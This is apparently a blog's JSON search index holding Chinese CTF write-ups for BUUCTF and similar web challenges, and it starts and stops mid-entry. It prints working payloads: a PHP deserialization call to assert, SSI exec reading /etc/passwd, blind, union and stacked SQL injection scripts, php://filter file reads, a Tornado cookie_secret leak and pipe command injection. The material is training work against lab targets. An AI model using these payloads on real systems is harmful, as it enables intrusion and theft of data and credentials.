publicCISCN{uLG8v-wGDDi-PfF4M-Pmc2U-uBqB2-} * @return int */\"\r题外话：在尝试过程中还发现了另一个类ReflectionClass 简介：ReflectionClass 类报告了一个类的有关信息。 和上面的那个类对比，两个类研究的对象不一样ReflectionMethod研究的是类中的方法，ReflectionClass 研究的是类。 这个类中也有一个获得注释的函数ReflectionClass::getDocComment，但是其获得的是文档注释，即文件开头的/**/中内容，但是本题的注释是在函数里的。 ","date":"2021-08-18","objectID":"/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/:0:0","series":null,"tags":["web","sql注入","php原生类"],"title":"CISCN线上赛库存","uri":"/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/#easy_source"},{"categories":["CTF"],"content":"\rReadlezPHP源码找到time.php?source php \u003c?php #error_reporting(0); class HelloPhp { public $a; public $b; public function __construct(){ $this-\u003ea = \"Y-m-d h:i:s\"; $this-\u003eb = \"date\"; } public function __destruct(){ $a = $this-\u003ea; $b = $this-\u003eb; echo $b($a); } } $c = new HelloPhp; if(isset($_GET['source'])) { highlight_file(__FILE__); die(0); } @$ppp = unserialize($_GET[\"data\"]);\r分析一波：最后一行一个反序列化，所以很明显是反序列化的题目，在HelloPhp中有一个__destruct方法，会在创建的对象销毁时执行，注意里面有一个echo输出，最重要的是后面的函数调用 ，好像是在PHP7某个版本之后只是使用形如$a($b)格式进行函数调用，假如变量a为字符串var_dump，b是任意字符串，就相当于调用var_dump函数且参数为b。 所以构造反序列化，调用assert函数执行phpinfo。如果向assert() 函数传递字符串，它将会被 assert() 当做 PHP 代码来执行)： text \u003c?php class HelloPhp { public $a='phpinfo()'; public $b='assert'; } $s=new HelloPhp(); echo serialize($s);\rPOST请求 text time.php?data=O:8:\"HelloPhp\":2:{s:1:\"a\";s:9:\"phpinfo()\";s:1:\"b\";s:6:\"assert\";}\r页面查找flag，在environment中找到flag ","date":"2021-04-20","objectID":"/posts/ctf/readlezphpeasysearch/:0:0","series":null,"tags":["反序列化","SSI注入"],"title":"ReadlezPHP\u0026EasySearch","uri":"/posts/ctf/readlezphpeasysearch/#readlezphp"},{"categories":["CTF"],"content":"\rEasySearch 进入页面以后试了试sql注入发现没用。第一步是看了wp找到的：使用扫描器扫描到index.php.swp文件： php \u003c?php ob_start(); function get_hash(){ $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^\u0026*()+-'; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); } header(\"Content-Type: text/html;charset=utf-8\"); *** if(isset($_POST['username']) and $_POST['username'] != '' ) { $admin = '6d0bc1'; if ( $admin == substr(md5($_POST['password']),0,6)) { echo \"\u003cscript\u003ealert('[+] Welcome to manage system')\u003c/script\u003e\"; $file_shtml = \"public/\".get_hash().\".shtml\"; $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\"); $text = ' *** *** \u003ch1\u003eHello,'.$_POST['username'].'\u003c/h1\u003e *** ***'; fwrite($shtml,$text); fclose($shtml); *** echo \"[!] Header error ...\"; } else { echo \"\u003cscript\u003ealert('[!] Failed')\u003c/script\u003e\"; }else { *** } *** ?\u003e 登陆功能又一个验证，需要传入的passwd参数使用md5加密以后是以6d0bc1开头的。简单写个脚本跑一下就有了： python # codeing=utf-8 import hashlib cnt=1; while True: md=hashlib.md5(str(cnt).encode(\"utf8\")).hexdigest() if md.startswith(\"6d0bc1\"): print(cnt) cnt+=1 #2020666 #2305004\r分析源码登陆以后会创建一个欢迎页，使用POST请求，抓包可以在响应头里找到创建文件的位置和名称。 看了看文件后缀是一格没有见过的：shtml，然后学到到了shtml有一种漏洞：SSI注入漏洞 SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。 简单的命令执行 code \"--\u003e'--\u003e`--\u003e\u003c\u003c!--#exec cmd=\"cat /etc/passwd\"--\u003e\r我使用了反弹shell，自行修改一下命令即可。在/var/www/html目录下可以找到一个名为flag_990c66bf85a09c664f0b6741840499b2的文件，获得flag ","date":"2021-04-20","objectID":"/posts/ctf/readlezphpeasysearch/:0:0","series":null,"tags":["反序列化","SSI注入"],"title":"ReadlezPHP\u0026EasySearch","uri":"/posts/ctf/readlezphpeasysearch/#easysearch"},{"categories":["CTF"],"content":"还是同一场比赛的界面 这次测试了下面的登陆框已经不能用了，无论怎么输入都是同一个回显：你可别被我逮住了，臭弟弟，测试上面的序号，注意此时的url中有?id=猜测是一个注入点，输入单引号一直报错，但是输入2-1时成功回显，判断是一个数字型注入，数字型注入最多遇到的就是结合盲注，接下来是测试盲注的过滤。 发现if、union、and等被过滤，在整个字符串中如果出现空格会被拦下，ord、ascii等转换字符没有被过滤，if被过滤可以使用strcmp函数等代替，空格可以使用括号绕过。 贴出来自己的脚本： python # codeing=utf-8 import requests import time url='http://1e069783-5d06-4d70-af82-c457e0d11a52.node3.buuoj.cn/search.php?id=' result='' for x in range(1, 100): high = 127 low = 32 mid = (low + high) // 2 while high\u003elow: # sql=\"(ORD(SUBSTR((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d)\"%(i,c) # sql = \"(ORD(SUBSTR((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))\u003e%d)\" % (x, mid) sql = \"(ORD(SUBSTR((select(group_concat(password))from(F1naI1y)where(id=9)),%d,1))\u003e%d)\" % (x, mid) time.sleep(0.1) reponse=requests.get(url+sql) if \"Click\" in reponse.text: low=mid+1 else: high = mid mid = (low+high)/2 result += chr(int(mid)) print(result)\r我是直接使用了判断字符的返回值1或0作为id的参数，因为使用group_concat拼接时字符串有逗号,所以字符ascii需要至少从44开始。 下面是查询到的两个表F1naI1y 、Flaaaaag及结构 F1naI1y ====\u003e id,username,password Flaaaaag ====\u003e id,fl4gawsl 在第九项可以查得到flag，上面的sql语句已经准备好了。第一个是查询表名的，第二个是查询字段名，第三个是得到flag ","date":"2021-04-18","objectID":"/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql/:0:0","series":null,"tags":["sql注入"],"title":"极客大挑战 2019 FinalSQL","uri":"/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql/#"},{"categories":["CTF"],"content":"进入页面直接报错 试试其他的地方，我的习惯是git泄露、请求头、robots.txt、hint.txt都看看。果然在robots下有内容 User-agent: * Disallow: /fAke_f1agggg.php 访问fAke_f1agggg.php并且抓包，在响应头里有提示。 访问fl4g.php才正式开始，源码如下： php \u003cimg src=\"/img.jpg\"\u003e \u003c?php header('Content-type:text/html;charset=utf-8'); error_reporting(0); highlight_file(__file__); //level 1 if (isset($_GET['num'])){ $num = $_GET['num']; if(intval($num) \u003c 2020 \u0026\u0026 intval($num + 1) \u003e 2021){ echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.\u003c/br\u003e\"; }else{ die(\"金钱解决不了穷人的本质问题\"); } }else{ die(\"去非洲吧\"); } //level 2 if (isset($_GET['md5'])){ $md5=$_GET['md5']; if ($md5==md5($md5)) echo \"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.\u003c/br\u003e\"; else die(\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\"); }else{ die(\"去非洲吧\"); } //get flag if (isset($_GET['get_flag'])){ $get_flag = $_GET['get_flag']; if(!strstr($get_flag,\" \")){ $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag); echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.\u003c/br\u003e\"; system($get_flag); }else{ die(\"快到非洲了\"); } }else{ die(\"去非洲吧\"); } ?\u003e 一关一关的bypass。 第一关 重点在intval函数，intval函数有个特性: 直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\\0)结束转换 这里需要num的值小于2020，加一后值大于2021，可以使用科学计数法方法绕过。构造payload2e9，遇到第一个函数转换时，因为是以2开头下一位是字符，会直接被截取为2；遇到第二个函数，因为使用了$num + 1会进行类型转换，2e9会先使用科学计数法计算出值并+1。 第二关 需要一个md5值，对这个值再次使用md5加密以后，使用弱类型比较，和原来的值相同。md5的一个弱类型比较绕过： PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。 使用脚本跑一下得到一个值：0e215962017。 最后一层，是一个system函数执行，但是在之前有一些过滤 strstr函数匹配空格，可以使用${IFS}绕过（这个里面有更详细的：命令执行漏洞利用及绕过方式总结） str_ireplace会吧cat替换成wctf2020，所以不能使用cat命令，可以用：more、less、od、tail等等绕过，上面的博客里也有写道。 先使用ls查看下当前目录下的文件，发现一个名为fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag读取得到flag。 最终payload： url /fl4g.php?num=2e9\u0026md5=0e215962017\u0026get_flag=more${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\r","date":"2021-04-16","objectID":"/posts/ctf/wustctf2020%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/:0:0","series":null,"tags":["RCE"],"title":"WUSTCTF2020 朴实无华","uri":"/posts/ctf/wustctf2020%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/#"},{"categories":["CTF"],"content":"一个登陆界面，再看下url地址为login.php，确认了使用的是php 直接查看源码，在源码中找到了register.php。先注册一个进去看一看。 是一个发布广告的信息页，发布广告时需要输入广告的标题和内容，联想一下之前做过的发布文章的，应该是sql注入，输入广告标题输入一个单引号'试一试 广告详情中出现了数据库报错 猜测应该是二次注入，发布时加上一些转义字符没有出现错误，但是查看详情时再次从数据库中取出带有payload的数据，可以执行sql语句。而且上面的单引号测试出来了是字符型单引号闭合。 接下来是尝试过滤。我试出来的有空格（使用/**/绕过）、or，and（可以使用\u0026\u0026，||），同时or被过滤，就说明保存数据库表名的库information_schema没有办法查询，并且orderby也不能使用，需要使用其他办法获取表内容。 测试一下当前表的字段数，从1开始加，一直会报字段数不匹配，直到尝试到22。还需要主义的是执行的sql语句后面的 LIMIT 0,1需要闭合，所以最后添加了一个单引号 sql '/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\r说明回显位是2和3。 由于没有办法查询表名，所以需要我们自己猜测，CTF比赛中常见的表名就是flag、users、举办方的缩写啥的。这种没有办法查询表名的题目表名应该都不会设置太难 测试的语句 sql '/**/union/**/select/**/1,(select/**/*/**/from/**/flag),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\r当测到users表时返回了当前字段数不匹配的错误，说名users里有多个字段，肯定没有办法显示在一列中。所以接下来是猜users表的字段数。 首先讲解一波无列名注入。 先来个正常表（flag）的查询 我们知道在sql语句查询的时候，可以给列名起别名形如 使用联合查询的时候，只要前后表的字段数相同，前面查询的就会成为表名 所以当我们不知道flag表的字段，并且想要查询里面的内容时，比如我想查询flag表的flag字段，可以构造 需要为子查询的结果再起一个别名（图中为x），这样我们就不用列名查询到了字段。总结一下思路就是：自己构造一个表名并且联合查询想要查询的表名，再使用group_concat函数输出自己构造的表名。 所以测试users表的字段数时，就通过形如上图的格式，改变联合查询的字段数判断。 最终的payload： sql '/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\r","date":"2021-04-15","objectID":"/posts/ctf/swpu2019web1/:0:0","series":null,"tags":["sql注入","无列名注入"],"title":"SWPU2019 Web1","uri":"/posts/ctf/swpu2019web1/#"},{"categories":["CTF"],"content":"寒假横向刷题（尽量） BUUCTF 💗🧡💛💚💙💜🤎🖤🤍 题都写这一个里面了，可以先用Ctrl+F搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#"},{"categories":["CTF"],"content":"\r2021.01.15","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#20210115"},{"categories":["CTF"],"content":"\r[HCTF 2018]WarmUp进到靶机一个硕大的滑稽，查看源码有提示source.php text \u003c?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026$page) { $whitelist = [\"source\"=\u003e\"source.php\",\"hint\"=\u003e\"hint.php\"]; if (! isset($page) || !is_string($page)) { echo \"you can't see it\"; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo \"you can't see it\"; return false; } } if (! empty($_REQUEST['file']) \u0026\u0026 is_string($_REQUEST['file']) \u0026\u0026 emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo \"\u003cbr\u003e\u003cimg src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /\u003e\"; } ?\u003e\r发现白名单有source.php和hint.php，先去查看一下hint.php flag not here, and flag in ffffllllaaaagggg 分析源码 判断$_REQUEST['file']对象为空且为字符串 执行emmm类中的checkFile方法判断是否在白名单（确保函数返回是true） 文件包含 checkFile函数中字符串截取判断是否在白名单（代码17-24和26-34）所以有两种绕过方法。 第一种 text file=hint.php?../../../../../ffffllllaaaagggg\r字符串截取将原字符串尾部加上?再截取第一个?之前的内容。所以需要在构造payload时问号前需要是白名单里的文件。问号之后，猜测flag位置在根目录下，所以使用尽可能多的../返回上级目录。 第二种 text hint.php%3F..%2F..%2F..%2F..%2F..%2Fffffllllaaaagggg\r将第一种payload使用urlencode编码即可。 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#hctf-2018warmup"},{"categories":["CTF"],"content":"\r[强网杯 2019]随便注 根据题目尝试sql注入，单引号报错，单引号加注释无报错，说明存在sql注入，当测试输入select时返回过滤的黑名单： text return preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject);\r这道题使用的是堆叠注入，原理 在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 查看数据库 text 1';show databases;\r查看当前库下的表 text 1';show tables;\r查看两张表字段 text 1';show columns from words;\r还有一种查看表的语句，在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符 text 1';desc `1919810931114514`;\r找到了flag在的字段，接下来就是如何获取该字段的值。顺带一提，根据表的结构，初步判断默认查询的是word表中的字段，而flag在1919810931114514表中。 网上找到的两种方法，分别是修改表名和使用预处理语句。 使用预处理语句 因为select被过滤了，但是可以使用char函数，char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。 text char(115,101,108,101,99,116)\r根据预处理语句格式构造payload 创建一个sqli字符串值为查询sql语句，使用预处理语句赋值并执行。 text 1';SET @sqli=concat(char(115,101,108,101,99,116),'* from `1919810931114514`');PREPARE hacker from @sqli;EXECUTE hacker;#\r不使用变量 text 1';PREPARE sqli FROM CONCAT('s','elect',' * from `1919810931114514`');EXECUTE sqli; #\r还有一种 text 1';SET @sqli = CONCAT('s','e','l','e','c','t',' * from `1919810931114514`');PREPARE haha FROM@sqli ;EXECUTE haha; #\r主要区别在于过滤的绕过方式，不要拘泥于一种方式。 修改表名 修改表名的思路是：默认查询的是word表第一个字段，所以把word表修改为其他名称，将flag所在的1919810931114514表名修改为word。 网上payload text 0';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc words;#\r自己构造的payload text 0';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) #\r之后执行 text 1' or 1=1 #\r查询表所有字段值即可。 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#强网杯-2019随便注"},{"categories":["CTF"],"content":"\r[极客大挑战 2019]EasySQL 用户名密码，尝试万能密码。 text 'or 1=1 # 随便密码\r一个万能密码的参考:https://www.cnblogs.com/pass-A/p/11134988.html ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019easysql"},{"categories":["CTF"],"content":"\r[极客大挑战 2019]Havefun 直接源码找到php代码。payload text ?cat=dog\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019havefun"},{"categories":["CTF"],"content":"\r[SUCTF 2019]EasySQL 单引号无报错，尝试堆叠注入可以回显。 和 [强网杯 2019]随便注这道题一样查库查表查字段 text 1;show databases; 1;show tables;\r但是执行 text 1;desc `Flag`; 1;show columns from Flag;\r返回了\"Nonono.“测试出被过滤了：desc、from、Flag。 接下来的都是抄网上的预期解也是第一次见。 比赛时源码泄露 text select $_GET['query'] || flag from flag\r在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能 payload text 1;set sql_mode=PIPES_AS_CONCAT;select 1\r非预期解 text *,1 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#suctf-2019easysql"},{"categories":["CTF"],"content":"\r[ACTF2020 新生赛]Include不截图了，进入靶机只有一个tips等着被点。跳转以后看url中参数 text ?file=flag.php\r页面内容只有 Can you find out the flag? 立马想到使用php伪协议读文件内容。使用filter过滤器 text ?file=php://filter/convert.base64-encode/resource=flag.php\r得到 text PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7OTAyNTIyNDgtMjY3NC00NDdjLWFlYWMtYjc3ZTc5YjYwMzVmfQo=\r解密得到flag ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#actf2020-新生赛include"},{"categories":["CTF"],"content":"\r[极客大挑战 2019]Secret File 查看源码，又一个背景是黑色的超链接跳转到 Archive_room.php。 查看源码SECRET跳转的是action.php。 但是跳转以后是url地址为end.php，所以中间跳过了一个页面，使用bp抓包查看。 stristr()函数返回字符串中子串第一次出现位置之后的内容，简而言之还是过滤。 同样使用php伪协议filter过滤器读取文件 text ?file=php://filter/convert.base64-encode/resource=flag.php\rtext PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZmZjZTAwNWYtYjEyOS00YWM1LTg3MzYtZDM3YzUwYjYxNjZkfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=\r解密得到网页源码，flag在其中。 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019secret-file"},{"categories":["CTF"],"content":"\r[极客大挑战 2019]LoveSQL顶端の告诫：用 sqlmap 是没有灵魂的 尝试万能密码（其实没卵用） text 'or 1=1 # 任意密码\r这道题是常规的sql注入，测注入点、查字段数、爆库、爆字段值、爆表。组合拳 字段数： text 1' order by 3 #\r爆库： text 1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() # geekuser,l0ve1ysq1\r爆字段值： text 1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1' # id,username,password\r爆表： text 1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1 # '1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{c4e8849c-e0e3-4e0d-b701-26a5abeec46a}'\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019lovesql"},{"categories":["CTF"],"content":"\r2021.01.21","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#20210121"},{"categories":["CTF"],"content":"\r[GXYCTF2019]Ping Ping Ping传送门 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#gxyctf2019ping-ping-ping"},{"categories":["CTF"],"content":"\r[ACTF2020 新生赛]Exec 肯定是尝试管道符 text 127.0.0.1|cat /flag\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#actf2020-新生赛exec"},{"categories":["CTF"],"content":"\r[护网杯 2018]easy_tornado打开页面三个超链接 /flag.txt /welcome.txt hints.txt 内容分别是 flag in /fllllllllllllag render md5(cookie_secret+md5(filename)) 进入hints.txt注意到url地址此时为 text /file?filename=/hints.txt\u0026filehash=2a84a09bc1d5e3d8745131754ff208fa\r再根据hints.txt文件的内容，推断可以使用url方式访问文件，但是需要提供filehash值，加密的方法即hints.txt的内容：md5(cookie_secret+md5(filename))。flag文件的名称filename有了，接下来就是获取cookie_secret的值。 接下来触及到盲区了，获取cookie_secret是看wp。 render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用 在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量 获取cookie_secret的payload text /error?msg={{handler.settings}}\r获得cookie_secret的值为 text eb326d39-cd67-47bd-b2d3-71125996417b\r根据hints.txt的url验证一下是如何加密的。 选中的蓝色部分是/hints.txt加密后的md5值。推断出filehash格式以后直接访问flag文件，payload： text /file?filename=/hints.txt\u0026filehash=2a84a09bc1d5e3d8745131754ff208fa\r","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#护网杯-2018easy_tornado"},{"categories":["CTF"],"content":"\r[极客大挑战 2019]Knife 一句话直接连。 ","date":"2021-01-18","objectID":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019knife"},{"categories":["CTF"],"content":"\r[RoarCTF 2019]Easy Calc 一个计算器随便试一试，当输入字母时会报错。查看网页源码，在script中发现了运行计算器的php文件：calc.php，但是也有一句很重要的注释 text \u003c!--I've set up WAF to ensure security.--\u003e\rphp的正则表达式中并没有过滤字母的条件，所以我们输入字母被过滤是因为WAF，接下来是参考网上的wp自己的理解 可以在calc.php传参 text ? num=a\rphp会输出一个值a，说明已经绕过了WAF。这里使用的是WAF和php解析方法不一样，WAF解析到空格’ ‘会直接过滤掉，这样WAF认为传入的就是一个空值，并不会识别num，但是php解析的时候会把空格去掉，这样就能get到num的值。 接下来绕过正则就可以使用char()的方式使用ascii码转。空格被过滤但是想使用php输出可以使用var_dump() 查看根目录下文件，可以使用scandir（）遍历文件夹，其中char（47）——\u003e ‘/’ ： text ? num=1;var_dump(scandir(chr(47)))\r找到了疑似flag文件：f1agg，使用file_get_contents（）读取文件 text 